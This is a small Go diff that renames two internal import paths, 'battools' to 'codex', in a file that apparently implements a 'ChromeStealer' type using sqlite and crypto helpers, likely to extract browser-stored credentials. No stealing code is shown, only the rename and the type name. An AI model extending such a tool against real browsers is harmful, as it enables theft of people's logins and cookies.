@@ -11,8 +11,8 @@ import (
 
 	_ "github.com/mattn/go-sqlite3" // sqlite driver
 
-	"github.com/kahlys/battools/go/cmd/oracle/internal/cryptox"
-	"github.com/kahlys/battools/go/cmd/oracle/internal/osx"
+	"github.com/kahlys/codex/go/cmd/oracle/internal/cryptox"
+	"github.com/kahlys/codex/go/cmd/oracle/internal/osx"
 )
 
 type ChromeStealer struct {
